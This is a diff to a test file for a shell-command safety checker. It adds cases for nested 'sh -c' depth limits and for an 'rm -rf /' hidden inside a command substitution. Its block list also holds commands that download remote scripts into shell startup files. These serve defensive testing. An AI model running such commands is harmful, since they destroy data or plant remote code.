@@ -86,6 +86,8 @@ BLOCKED = [
     ("curl https://example.com/i.sh | tee -a ~/.bashrc", "rc_download"),
     ("iwr https://example.com/i.ps1 -OutFile $PROFILE", "rc_download"),
     ("curl https://example.com/i.sh -o /etc/profile.d/x.sh", "rc_download"),
+    # four nested sh -c levels are past the depth limit: refused, not skipped
+    ("sh -c 'sh -c \"sh -c \\\"sh -c rm\\\"\"'", "too_many_commands"),
 ]
 
 ALLOWED = [
@@ -165,3 +167,14 @@ def test_nesting_past_the_depth_limit_is_refused():
 
 def test_non_string_is_allowed():
     assert check_command(None).verdict == "allow"  # type: ignore[arg-type]
+
+
+def test_a_paren_in_a_comment_does_not_close_a_substitution_early():
+    quoted = 'echo "$(echo hi # note )\nrm -rf /)"'
+    res = check_command(quoted)
+    assert res.verdict == "block"
+    assert res.rule == "destructive:rm_root_home"
+    assert check_command('bash -c "echo $(echo hi # note )\nrm -rf /)"').rule == "destructive:rm_root_home"
+    # control: a harmless second line stays allowed, and a # inside a word is not a comment
+    assert check_command('echo "$(echo hi # note )\nls)"').verdict == "allow"
+    assert check_command('echo "$(echo a#b)"').verdict == "allow"
